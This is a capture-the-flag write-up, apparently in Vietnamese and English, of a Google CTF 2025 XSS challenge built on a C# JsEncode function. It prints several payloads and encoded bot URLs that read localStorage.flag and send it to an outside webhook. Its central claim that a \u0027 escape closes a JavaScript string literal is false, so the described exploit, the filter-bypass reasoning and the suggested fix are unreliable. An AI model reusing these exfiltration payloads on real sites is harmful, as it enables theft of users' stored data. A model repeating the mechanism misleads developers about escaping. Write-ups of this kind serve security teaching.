# CTF Writeup — Lost in Transliteration

> **Google CTF 2025 · Web · XSS / Unicode Exploitation**

| Field | Value |
|---|---|
| **Category** | Web |
| **Difficulty** | Medium–Hard |
| **Platform** | Google CTF 2025 |
| **Stack** | C# ASP.NET Core + Node.js Puppeteer + Lit 3 |
| **Vulnerability** | Unicode escape sequence injection (`\u0027` string break) |
| **Goal** | XSS bot đọc `localStorage.flag` và exfiltrate |

---

## 1. Tổng quan challenge

Challenge cung cấp một web app C# ASP.NET Core đơn giản: **Greek to Latin Transliterator** — một công cụ chuyển ký tự Hy Lạp sang Latin. Có một XSS bot (`/xss-bot`) sử dụng Puppeteer, và trước khi visit URL do ta cung cấp, bot đặt `localStorage.flag = <real_flag>` trên origin `http://localhost:1337`.

Mục tiêu: **khai thác XSS** để đọc và exfiltrate `localStorage.flag`.

### Kiến trúc hệ thống

```
[Attacker] --(1) POST /xss-bot?url=--> [C# Server]
                                              |
                                        (2) spawn bot.mjs
                                              |
                                        (3) bot sets localStorage.flag
                                        (4) bot visits our URL
                                        (5) XSS fires -> flag exfiltrated
                                        [Attacker's webhook]
```

### Các file quan trọng

| File | Vai trò |
|---|---|
| `Program.cs` | Server chính: endpoints `/`, `/file`, `/xss-bot`; logic `JsEncode()` và XSS filter |
| `bot.mjs` | Puppeteer bot: set flag vào localStorage, visit URL |
| `TEMPLATE_JS` | Nội dung script.js với transliteration logic và `TEMPLATE_QUERY_JS` placeholder |

---

Cần buil docker trước khi triển khai bypass với 2 lệnh :

```docker build -t lost-web . ``` Và ``` docker run --privileged --name lost-in-transliteration -it --rm -p 1337:1337 lost-web /bin/bash /home/user/start.sh ```

Sau đó hãy giữ nguyên cửa sổ PowerShell đó và quay lại trình duyệt F5 lại trang http://localhost:1337 nhé!

![Uploading image.png…]()


## 2. Phân tích mã nguồn chi tiết

### 2.1. Flow xử lý request

**Endpoint `/` (main page):**
```csharp
app.MapGet("/", (string q = "", string ct = "") =>
{
  return Results.Text($@"
    <!doctype html><meta charset=utf-8>
    <body>
    ...
    <script type=module src='/file?filename=script.js&q={HttpUtility.UrlEncode(q)}&ct=text/javascript'></script>
  ", contentType: "text/html");
});
```

- Nhận param `q` từ URL
- URL-encode `q` và nhúng vào `src` của `<script type=module>`
- Content-type của script là `text/javascript` (hardcoded)

**Endpoint `/file` (serve template files):**
```csharp
app.MapGet("/file", (string filename = "", string? ct = null, string? q = null) =>
{
  string? template = FindFile(filename);
  ct ??= "text/plain";
  if (!IsValidContentType(ct)) return Results.BadRequest("Invalid Content-Type");
  string text = template.Replace("TEMPLATE_QUERY_JS", JsEncode(q));
  return Results.Text(text, contentType: ct);
});
```

- Thay thế `TEMPLATE_QUERY_JS` trong template bằng `JsEncode(q)`
- Trả về với Content-Type do client chỉ định (`ct`)

**Endpoint `/xss-bot`:**
```csharp
app.MapGet("/xss-bot", async (string url, SemaphoreSlim semaphore) => ...);
```

- Chỉ nhận URL bắt đầu bằng `http://localhost:1337/`
- Spawn `bot.mjs` với URL đó

### 2.2. Bot behavior (`bot.mjs`)

```javascript
const FLAG = readFileSync("/home/user/flag.txt").toString("utf-8").trim();
// ...
await page.evaluateOnNewDocument((flag) => {
  if (window.origin === "http://localhost:1337") {
    localStorage.setItem("flag", flag);
  }
}, FLAG);
await page.goto(url, { waitUntil: "networkidle2" });
```

Bot đặt `localStorage.flag = realFlag` **trước khi** load page, chỉ trên origin `localhost:1337`. Vậy cần XSS trên chính origin này.

### 2.3. Hàm `JsEncode()` — trái tim của bug

```csharp
private static bool IsSafeChar(char c)
{
  var cat = char.GetUnicodeCategory(c);
  // We don't consider ModifierLetter safe.
  var isLetter = cat == UnicodeCategory.LowercaseLetter ||
                 cat == UnicodeCategory.UppercaseLetter ||
                 cat == UnicodeCategory.OtherLetter;
  return isLetter || char.IsWhiteSpace(c);
}

private static string JsEncode(string? s)
{
  if (s is null) return "";
  var sb = new StringBuilder();
  foreach (char c in s)
  {
    if (IsSafeChar(c))
      sb.Append(c);
    else
    {
      sb.Append("\\u");
      sb.Append(Convert.ToInt32(c).ToString("x4"));
    }
  }
  return sb.ToString();
}
```

**Logic:** Ký tự nào là `Letter` (Ll, Lu, Lo) hoặc whitespace → pass qua nguyên văn. Còn lại → encode thành `\uXXXX`.

**Ví dụ:**
| Input | Output JsEncode |
|---|---|
| `α` (Greek Lo) | `α` (pass through) |
| `A` (Latin Lu) | `A` (pass through) |
| `<` (U+003C) | `\u003c` |
| `'` (U+0027) | `\u0027` |
| `;` (U+003B) | `\u003b` |
| `(` (U+0028) | `\u0028` |

### 2.4. XSS filter trong script.js

```javascript
window.q = 'TEMPLATE_QUERY_JS';  // <-- injection point

// XSS prevention
const PAYLOADS = [`<script>`, `</script>`, `javascript:`, `onerror=`];
for (const payload of PAYLOADS) {
  if (window.q.toLowerCase().includes(payload)) {
    throw new Error('XSS!');
  }
}
```

Filter chỉ block 4 pattern cụ thể, case-insensitive. Nhiều XSS payload khác như `<svg onload=`, `<img src=`, `<details ontoggle=` hoàn toàn **không bị block**.

---

## 3. Nhận dạng dạng challenge

| Đặc điểm | Nhận định |
|---|---|
| Có XSS bot đặt flag vào localStorage | → XSS challenge, cần steal localStorage |
| JsEncode escapes mọi ký tự nguy hiểm | → Tìm cách bypass encoding |
| XSS filter chỉ check 4 payload cụ thể | → Filter bypass |
| Challenge name "Lost in Transliteration" | → Bug liên quan đến encoding/Unicode |
| Comment: "We don't consider ModifierLetter safe" | → Hint về Unicode category |

**Dự đoán hướng tấn công:** Unicode encoding mismatch giữa C# server và JavaScript engine dẫn đến string injection.

---

## 4. Phân tích lỗ hổng — Unicode String Break

### 4.1. The root cause

Điểm injection trong script.js template là:
```javascript
window.q = 'TEMPLATE_QUERY_JS';
```

`JsEncode` thay `TEMPLATE_QUERY_JS` bằng output của nó. Với input chứa `'` (single quote, U+0027):
- `'` không phải Letter → JsEncode encode thành `\u0027`
- Trong JS source: `window.q = '\u0027...';`

**Câu hỏi then chốt:** Trong JavaScript, `\u0027` bên trong string literal có bị tokenizer interpret là dấu nháy thật không?

**Câu trả lời: CÓ!**

JavaScript tokenizer xử lý `\uXXXX` escape sequences **trong quá trình lexing** (phân tích string literal), không phải runtime. Vì vậy:

```javascript
var s = '\u0027;  // \u0027 = ' -> ĐÓNG string!
```

Equivalent với:
```javascript
var s = '';  // string rỗng
```

Phần còn lại `\u003balert\u00281\u0029` trong source code được interpret là **code**:
- `\u003b` = `;` (statement separator)
- `alert` = identifier (letters)
- `\u0028` = `(` , `\u0031` = `1` , `\u0029` = `)`
- → `alert(1)` executes!

### 4.2. Tại sao JsEncode fail?

`JsEncode` được thiết kế để "escape" ký tự nguy hiểm bằng `\uXXXX`, nghĩ rằng chúng sẽ an toàn trong string literal. Nhưng:

```
C# perspective: '\u0027' là chuỗi an toàn gồm 6 ký tự: \, u, 0, 0, 2, 7
JS perspective: '\u0027' là string literal chứa 1 ký tự: '  (CLOSE QUOTE!)
```

Đây là mismatch cơ bản giữa **ý định của developer** (escape để ký tự an toàn trong string) và **thực tế của JS lexer** (Unicode escape sequences được evaluated trong quá trình tokenization).

### 4.3. Tại sao XSS filter fail?

Execution order quan trọng:
```javascript
// JS thực thi tuần tự:
window.q = '\u0027;PAYLOAD;//';
//           ^ \u0027 terminates string here
//             ^ PAYLOAD executes HERE (step 1)
//                      ^ rest is comment

// Step 2: Filter chạy SAU khi PAYLOAD đã execute
const PAYLOADS = [`<script>`, `</script>`, `javascript:`, `onerror=`];
for (const payload of PAYLOADS) {
  if (window.q.toLowerCase().includes(payload)) {  // window.q = '' ← EMPTY!
    throw new Error('XSS!');
  }
}
```

Lúc filter chạy, `window.q = ''` (empty string vì string bị break tại `\u0027`). Filter kiểm tra `''` → không match gì → **pass**. Nhưng payload đã chạy rồi!

---

## 5. Attack Path — Step by Step

### 5.1. Tổng thể attack flow

```
[1] Ta tạo payload:  ';MALICIOUS_JS;//
[2] Gửi đến /?q=PAYLOAD  (URL-encoded)
[3] Server HTML chứa: <script src='/file?...&q=URLENCODE(PAYLOAD)&ct=text/javascript'>
[4] Browser fetch script.js, server calls JsEncode(PAYLOAD):
     ' → \u0027
     ; → \u003b
     letters → pass through
     ( ) → \u0028 \u0029
     etc.
[5] script.js source chứa:
     window.q = '\u0027\u003bMALICIOUS_JS\u003b\u002f\u002f';
[6] JS tokenizer: \u0027 = ' → string breaks, window.q = ''
[7] Remaining code executes: ;MALICIOUS_JS;//
[8] XSS filter: window.q = '' → pass
[9] MALICIOUS_JS đã chạy với quyền origin localhost:1337!
[10] localStorage.flag được đọc và exfiltrated
```

### 5.2. Tại sao `new Image().src` thay vì `fetch`?

- `fetch()` bị CORS policy block khi gửi đến external domain
- `new Image().src = url` là **side-channel request** (GET request) — không bị CORS block
- `navigator.sendBeacon()` cũng work
- `document.location = url` work nhưng redirect trang, có thể bị detect

### 5.3. Tại sao cần `//` ở cuối payload?

Template JS là: `window.q = 'ENCODED';`

Sau khi string break:
```
window.q = '';PAYLOAD//';
                      ^^ comment out trailing ';
```

Không có `//`, phần `';` sẽ là syntax error (dangling `'` thứ 2 bắt đầu string mới, rồi `;` close nó... có thể harmless hoặc syntax error tùy context). Thêm `//` đảm bảo clean execution.

---

## 6. Exploit

### 6.1. Payload construction

**Target code ta muốn inject:**
```javascript
;new Image().src='https://WEBHOOK/?f='+localStorage.getItem('flag');//
```

**Raw input để gửi vào `q` parameter:**
```
';new Image().src='https://WEBHOOK/?f='+localStorage.getItem('flag');//
```

**Sau khi qua JsEncode (output trong script.js source):**
```
\u0027\u003bnew Image\u0028\u0029\u002esrc\u003d\u0027https\u003a\u002f\u002fWEBHOOK\u002f\u003ff\u003d\u0027\u002blocalStorage\u002egetItem\u0028\u0027flag\u0027\u0029\u003b\u002f\u002f
```

**Full JS line in script.js:**
```javascript
window.q = '\u0027\u003bnew Image\u0028\u0029\u002esrc\u003d\u0027https\u003a\u002f\u002fWEBHOOK\u002f\u003ff\u003d\u0027\u002blocalStorage\u002egetItem\u0028\u0027flag\u0027\u0029\u003b\u002f\u002f';
```

**JavaScript tokenizer interprets this as:**
```javascript
window.q = '';  // \u0027 = ' terminates string
// then executes:
;new Image().src='https://WEBHOOK/?f='+localStorage.getItem('flag');
// (the trailing '; is commented out by //)
```

### 6.2. Kiểm tra XSS filter bypass

| Check | window.q value | Result |
|---|---|---|
| `'<script>'` | `''` | ❌ not included → PASS |
| `'</script>'` | `''` | ❌ not included → PASS |
| `'javascript:'` | `''` | ❌ not included → PASS |
| `'onerror='` | `''` | ❌ not included → PASS |

Filter hoàn toàn bypass vì `window.q = ''`!

### 6.3. Exploit steps

**Bước 1: Setup webhook**

Dùng webhook.site hoặc tự host một HTTP listener:
```
https://webhook.site/YOUR_UUID
```

**Bước 2: Tạo URL**

```
http://localhost:1337/?q=';new Image().src='https://webhook.site/UUID?f='+localStorage.getItem('flag');//
```

URL-encoded:
```
http://localhost:1337/?q=%27%3Bnew%20Image%28%29.src%3D%27https%3A//webhook.site/UUID%3Ff%3D%27%2BlocalStorage.getItem%28%27flag%27%29%3B//
```

**Bước 3: Submit đến XSS bot**

```
GET /xss-bot?url=http%3A//localhost%3A1337/%3Fq%3D%2527%253Bnew%2520Image%2528%2529.src%253D%2527https%253A//webhook.site/UUID%253Ff%253D%2527%252BlocalStorage.getItem%2528%2527flag%2527%2529%253B//
```

**Bước 4: Bot flow**

```
1. Bot creates fresh browser context
2. Bot runs: localStorage.setItem('flag', 'CTF{real_flag_here}')
   (only on origin http://localhost:1337)
3. Bot visits our URL
4. script.js loads, \u0027 breaks string
5. new Image().src = 'https://webhook.site/UUID?f=CTF{real_flag_here}'
6. Webhook receives GET with flag in f= param
```

**Bước 5: Đọc flag từ webhook**

```
Incoming request: GET /?f=CTF{real_flag_here}
```

### 6.4. Payload variants

**Variant A — Image beacon (recommended, no CORS):**
```javascript
';new Image().src='https://WEBHOOK/?f='+localStorage.getItem('flag');//
```

**Variant B — fetch no-cors:**
```javascript
';fetch('https://WEBHOOK/?f='+localStorage.getItem('flag'),{mode:'no-cors'});//
```

**Variant C — document.location redirect:**
```javascript
';document.location='https://WEBHOOK/?f='+localStorage.getItem('flag');//
```

**Variant D — navigator.sendBeacon:**
```javascript
';navigator.sendBeacon('https://WEBHOOK',localStorage.getItem('flag'));//
```

---

## 7. Tại sao các layer bảo vệ fail?

### 7.1. JsEncode — Security by Obscurity

| Assumption sai | Thực tế |
|---|---|
| `\uXXXX` là chuỗi literal an toàn trong string | JS tokenizer evaluate `\uXXXX` trong string literals → char thật |
| Encode `'` thành `\u0027` ngăn string injection | `\u0027` trong JS string = `'` → BREAKS THE STRING |
| Letters (a-z, A-Z) luôn an toàn | Đúng, nhưng letters + encoded punct = code injection |

### 7.2. XSS Filter — Too Narrow Blocklist

Filter chỉ block 4 patterns, bỏ sót:
- `<svg onload=...>`
- `<img src=x>` (nếu không dùng `onerror=`)  
- `<details ontoggle=...>`
- `<body onload=...>`
- Và nhiều hơn nữa

Nhưng quan trọng hơn: filter chạy **sau** khi code đã execute, và kiểm tra `window.q` sau khi string break → `window.q = ''`.

### 7.3. Lit `html``— Không phải điểm attack

Lit framework với `html`` template tag an toàn cho text bindings — `${value}` trong text position luôn được escape. Đây **không phải** điểm tấn công trong challenge này. Attack xảy ra hoàn toàn trong JS bootstrapping code, trước khi Lit component được mount.

---

## 8. Key Takeaways

**1. `\uXXXX` trong JS string literals bị evaluate khi lexing:**
```javascript
// Developer thinks this is safe:
var s = '\u003cscript\u003e';  // → s = '<script>' at runtime
// Fine as a VALUE, but '\u0027' TERMINATES the string literal
```

**2. Server-side escaping phải match client-side parsing:**
- C# `JsEncode` nghĩ `\u0027` là chuỗi 6 ký tự an toàn
- JS tokenizer thấy `\u0027` là ký tự `'` → string terminator
- Dùng `\"` hay `\'` escape thực sự, không dùng `\uXXXX` cho quote chars trong string literal

**3. XSS filter nên check trước khi nhúng vào DOM/code, không check sau:**
- Filter phải chạy **server-side** hoặc **trước khi inject**
- Checking `window.q` sau assignment là quá muộn nếu assignment đã break string

**4. Blocklist-based XSS prevention luôn thiếu:**
- Dùng Content Security Policy (CSP) thay vì blocklist
- Dùng context-aware output encoding

**5. Challenge name là hint:**
- "Lost in Transliteration" → encoding được "dịch" không đúng giữa C# và JS
- Comment "We don't consider ModifierLetter safe" → hint về Unicode category awareness

---

## 9. Remediation

**Fix đúng cho `JsEncode`:**
```csharp
private static string JsEncode(string? s)
{
  if (s is null) return "";
  var sb = new StringBuilder();
  foreach (char c in s)
  {
    // Escape ALL non-alphanumeric chars, not just non-letters
    if (char.IsAsciiLetterOrDigit(c))
      sb.Append(c);
    else
    {
      sb.Append("\\u");
      sb.Append(Convert.ToInt32(c).ToString("x4"));
    }
  }
  return sb.ToString();
}
```

Hoặc tốt hơn: **không nhúng user input trực tiếp vào JS string literal**. Dùng `<script>window.q = JSON.parse(document.getElementById('data').textContent);</script>` với data được HTML-encoded trong một `<script type=application/json>` tag.

---

*— End of Writeup — Lost in Transliteration | Google CTF 2025*

*- WR26 -*
